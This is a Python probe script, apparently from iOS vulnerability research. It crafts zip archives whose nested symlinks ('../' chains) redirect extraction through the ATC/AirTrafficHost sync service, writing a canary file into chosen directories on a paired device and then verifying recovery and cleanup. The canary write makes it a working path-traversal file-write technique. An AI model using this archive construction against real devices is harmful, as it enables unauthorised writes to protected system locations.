#!/usr/bin/env python3
"""Test a relocatable directory containing a second symlink on iOS 24A435."""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import tempfile
import zipfile
from pathlib import Path
from typing import Any

import nested_symlink_probe as base


DEEP_PREFIX = "deep0/deep1/deep2/deep3/deep4/deep5/deep6/deep7"


def build_archive(
    target_directory: str,
    container_leaf: str,
    pivot_leaf: str,
    payload: bytes,
) -> tuple[bytes, str, str, str]:
    promise_tail = base.safe_tail(base.PROMISE_DIRECTORY)
    target_tail = base.safe_tail(target_directory)
    container_tail = f"{DEEP_PREFIX}/{container_leaf}"
    destination_depth = len(promise_tail.split("/")) + 1
    if len(container_tail.split("/")) != destination_depth:
        raise RuntimeError("container depth invariant failed")

    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    seen: set[str] = set()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(base.zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            base.zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(base.zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            base.zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{promise_tail}".encode(),
        )
        base.add_directories(archive, promise_tail, seen)
        base.add_directories(archive, container_tail, seen)
        archive.writestr(
            base.zip_info(f"{container_tail}/{pivot_leaf}", stat.S_IFLNK | 0o777),
            (("../" * destination_depth) + target_tail).encode(),
        )
        base.add_directories(archive, target_tail, seen)
        archive.writestr(
            base.zip_info("payload", stat.S_IFREG | 0o600), payload
        )
    return output.getvalue(), promise_tail, target_tail, container_tail


def stage_books(
    udid: str,
    source: str,
    outer_link: str,
    sentinel: str,
    pivot_leaf: str,
    books_path: Path,
) -> dict[str, Any]:
    return base.mobile(
        udid,
        "stage-nested-recovery-books",
        source,
        outer_link,
        sentinel,
        os.fspath(books_path),
        pivot_leaf,
    )


def probe_state(
    udid: str,
    source: str,
    outer_link: str,
    recovered_payload: str,
    recovered_container: str,
    container_leaf: str,
    pivot_leaf: str,
) -> dict[str, Any]:
    return base.mobile(
        udid,
        "probe-nested-container-state",
        source,
        outer_link,
        recovered_payload,
        recovered_container,
        container_leaf,
        pivot_leaf,
    )


def run_target(udid: str, label: str, target_directory: str) -> dict[str, Any]:
    token = secrets.token_hex(10)
    source = f"codex-dir-src-24A435-{token}"
    outer_link = f"codex-dir-link-24A435-{token}"
    container_leaf = f"codex-dir-container-24A435-{token}"
    pivot_leaf = f"codex-dir-pivot-24A435-{token}"
    recovered_payload = f"codex-dir-recovered-24A435-payload-{token}"
    recovered_container = f"codex-dir-recovered-24A435-container-{token}"
    sentinel = f"codex-dir-recovered-24A435-sentinel-{token}"
    target_leaf = f"com.codex.nested-container-canary-{secrets.token_hex(16)}.bin"
    payload = (
        f"codex iOS nested-container canary\nbuild=24A435\nlabel={label}\n"
        f"nonce={secrets.token_hex(24)}\n"
    ).encode()
    archive, promise_tail, target_tail, container_tail = build_archive(
        target_directory, container_leaf, pivot_leaf, payload
    )

    outer_identifier = f"../../{source}/p0/p1/p2/link"
    container_identifier = f"../../{source}/{container_tail}"
    payload_identifier = f"../../{source}/payload"
    target_path = f"{target_directory.rstrip('/')}/{target_leaf}"
    target_identifier = posixpath.relpath(target_path, base.AIRLOCK_BOOK_ROOT)
    container_through_outer = f"{base.MEDIA_ROOT}/{outer_link}/{container_leaf}"
    container_through_identifier = posixpath.relpath(
        container_through_outer, base.AIRLOCK_BOOK_ROOT
    )
    books = base.build_books([outer_identifier])

    result: dict[str, Any] = {
        "label": label,
        "targetDirectory": target_directory,
        "targetLeaf": target_leaf,
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksSHA256": hashlib.sha256(books).hexdigest(),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "existingFilesTargeted": False,
        "canonicalMobileGestaltCacheTouched": False,
    }

    with tempfile.TemporaryDirectory(prefix="atc-nested-container-ios-") as work_dir:
        work = Path(work_dir)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        expected_path = work / "expected.bin"
        archive_path.write_bytes(archive)
        books_path.write_bytes(books)
        expected_path.write_bytes(payload)

        result["preflight"] = base.mobile(udid, "probe-afc")
        if not base.operation_ok(result["preflight"]) or result["preflight"][
            "operation"
        ].get("booksSyncPlistPresent"):
            result["outcome"] = "preflight-failed"
            return result

        result["stage"] = base.mobile(
            udid,
            "stage",
            source,
            outer_link,
            recovered_payload,
            os.fspath(archive_path),
            os.fspath(books_path),
        )
        if not base.operation_ok(result["stage"]):
            result["outcome"] = "stage-failed"
            return result

        result["outerATC"] = base.atc(
            udid, [(outer_identifier, outer_link)]
        )
        result["postOuter"] = probe_state(
            udid,
            source,
            outer_link,
            recovered_payload,
            recovered_container,
            container_leaf,
            pivot_leaf,
        )
        state = result["postOuter"].get("operation", {})
        if not state.get("linkPresent"):
            result["outcome"] = "outer-relocation-failed-cleanup-preserved"
            result["residueAccountedFor"] = False
            return result

        container_path = work / "Container.plist"
        container_path.write_bytes(base.build_books([container_identifier]))
        result["containerStage"] = stage_books(
            udid,
            source,
            outer_link,
            sentinel,
            pivot_leaf,
            container_path,
        )
        if base.operation_ok(result["containerStage"]):
            result["containerATC"] = base.atc(
                udid,
                [(container_identifier, f"{outer_link}/{container_leaf}")],
            )
        result["postContainer"] = probe_state(
            udid,
            source,
            outer_link,
            recovered_payload,
            recovered_container,
            container_leaf,
            pivot_leaf,
        )
        state = result["postContainer"].get("operation", {})

        if not state.get("sourceContainerPresent"):
            payload_path = work / "Payload.plist"
            payload_path.write_bytes(base.build_books([payload_identifier]))
            result["payloadStage"] = stage_books(
                udid,
                source,
                outer_link,
                sentinel,
                pivot_leaf,
                payload_path,
            )
            if base.operation_ok(result["payloadStage"]):
                result["payloadATC"] = base.atc(
                    udid,
                    [(
                        payload_identifier,
                        f"{outer_link}/{container_leaf}/{pivot_leaf}/{target_leaf}",
                    )],
                )

            target_recovery_path = work / "TargetRecovery.plist"
            target_recovery_path.write_bytes(base.build_books([target_identifier]))
            result["targetRecoveryStage"] = stage_books(
                udid,
                source,
                outer_link,
                sentinel,
                pivot_leaf,
                target_recovery_path,
            )
            if base.operation_ok(result["targetRecoveryStage"]):
                result["targetRecoveryATC"] = base.atc(
                    udid, [(target_identifier, recovered_payload)]
                )

            container_recovery_path = work / "ContainerRecovery.plist"
            container_recovery_path.write_bytes(
                base.build_books([container_through_identifier])
            )
            result["containerRecoveryStage"] = stage_books(
                udid,
                source,
                outer_link,
                recovered_container,
                pivot_leaf,
                container_recovery_path,
            )
            if base.operation_ok(result["containerRecoveryStage"]):
                result["containerRecoveryATC"] = base.atc(
                    udid, [(container_through_identifier, recovered_container)]
                )
            result["postContainerRecovery"] = probe_state(
                udid,
                source,
                outer_link,
                recovered_payload,
                recovered_container,
                container_leaf,
                pivot_leaf,
            )
            state = result["postContainerRecovery"].get("operation", {})

        container_accounted = bool(
            state.get("sourceContainerPresent")
            or state.get("recoveredContainerPresent")
        )
        if not container_accounted:
            result["outcome"] = "container-recovery-unproved-cleanup-preserved"
            result["residueAccountedFor"] = False
            return result

        result["cleanupPromiseBranch"] = base.mobile(
            udid,
            "verify-matrix-cleanup",
            source,
            outer_link,
            recovered_payload,
            os.fspath(expected_path),
            promise_tail,
        )
        result["cleanupDeepBranch"] = base.mobile(
            udid,
            "verify-matrix-cleanup",
            source,
            outer_link,
            f"{recovered_container}/{pivot_leaf}",
            os.fspath(expected_path),
            f"{container_tail}/{pivot_leaf}",
        )
        result["cleanupTargetBranch"] = base.mobile(
            udid,
            "verify-matrix-cleanup",
            source,
            outer_link,
            recovered_container,
            os.fspath(expected_path),
            target_tail,
        )
        result["finalPreflight"] = base.mobile(udid, "probe-afc")

        first = result["cleanupPromiseBranch"].get("operation", {})
        third = result["cleanupTargetBranch"].get("operation", {})
        result["writeAndExactRecoveryConfirmed"] = bool(
            first.get("recoveredPresent") and first.get("recoveredBytesMatch")
        )
        result["residueAccountedFor"] = bool(
            third.get("safeArguments")
            and third.get("sourceMediaAbsent")
            and third.get("linkAbsent")
            and third.get("recoveredAbsent")
            and third.get("booksFilesAbsent")
            and not result["finalPreflight"].get("operation", {}).get(
                "booksSyncPlistPresent"
            )
        )
        result["outcome"] = (
            "write-and-exact-recovery-confirmed"
            if result["writeAndExactRecoveryConfirmed"]
            else "no-write-observed"
        )
    return result


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--udid", required=True)
    parser.add_argument("--label", action="append")
    args = parser.parse_args()
    selected = set(args.label or [label for label, _ in base.TARGETS])
    unknown = selected.difference(label for label, _ in base.TARGETS)
    if unknown:
        parser.error(f"unknown labels: {', '.join(sorted(unknown))}")

    summary: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipNestedContainerSymlinkIOSDirectoryProbe",
        "expectedProduct": base.EXPECTED_PRODUCT,
        "expectedVersion": base.EXPECTED_VERSION,
        "expectedBuild": base.EXPECTED_BUILD,
        "transport": "paired localNetwork via native MobileDevice/AirTrafficHost",
        "existingFilesTargeted": False,
        "canonicalMobileGestaltCacheTouched": False,
        "targets": [],
    }
    chosen_rows = [(label, path) for label, path in base.TARGETS if label in selected]
    for index, (label, directory) in enumerate(chosen_rows, 1):
        row = run_target(args.udid, label, directory)
        summary["targets"].append(row)
        print(
            json.dumps(
                {
                    "progress": f"{index}/{len(chosen_rows)}",
                    "label": label,
                    "targetDirectory": directory,
                    "outcome": row.get("outcome"),
                    "residueAccountedFor": row.get("residueAccountedFor"),
                },
                sort_keys=True,
            ),
            flush=True,
        )
        if not row.get("residueAccountedFor"):
            summary["abortedAfter"] = label
            break

    summary["confirmedWriteDirectories"] = [
        row["targetDirectory"]
        for row in summary["targets"]
        if row.get("writeAndExactRecoveryConfirmed")
    ]
    summary["noWriteObservedDirectories"] = [
        row["targetDirectory"]
        for row in summary["targets"]
        if row.get("outcome") == "no-write-observed"
    ]
    summary["allGeneratedArtifactsAccountedFor"] = bool(
        summary["targets"]
        and all(row.get("residueAccountedFor") for row in summary["targets"])
        and "abortedAfter" not in summary
    )
    summary["ok"] = summary["allGeneratedArtifactsAccountedFor"]
    print(json.dumps(summary, sort_keys=True))
    return 0 if summary["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
